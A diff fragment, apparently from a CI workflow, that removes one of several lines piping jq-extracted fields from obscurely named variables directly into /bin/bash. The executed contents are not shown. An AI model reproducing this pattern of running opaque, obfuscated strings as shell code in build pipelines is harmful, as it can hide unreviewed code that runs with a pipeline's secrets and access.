@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$ddps50049" | jq -r .sdqh909 | /bin/bash
           echo $h2 | jq -r .w05 | /bin/bash
           echo $r3899 | jq -r .ad61 | /bin/bash
-          printf '%s' "$p5631" | jq -r .c591 | /bin/bash
           printf '%s' "$ygel70865" | jq -r .f1606 | /bin/bash
 
       - name: Save archive
